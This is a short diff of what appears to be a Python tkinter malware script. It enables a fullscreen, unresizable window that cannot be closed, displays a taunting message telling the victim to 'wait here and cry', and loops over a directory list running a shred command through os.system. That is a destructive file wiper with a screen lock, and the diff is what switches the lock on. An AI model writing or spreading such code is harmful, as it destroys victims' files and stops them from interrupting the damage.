@@ -38,11 +38,11 @@ def MainThread():
     tk.Label(root, font = ("Cascadia Code", 10), text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()
 
     root.geometry("1920x1080")
-    #root.resizable(False,False)
-    #root.attributes('-fullscreen',True)
+    root.resizable(False,False)
+    root.attributes('-fullscreen',True)
 
     root.config(bg=UT.rgb_hack((0, 0, 0)))
-    #root.protocol("WM_DELETE_WINDOW", preventClose) 
+    root.protocol("WM_DELETE_WINDOW", preventClose) 
 
     for x in directory_list:
         os.system(shred_command + x)
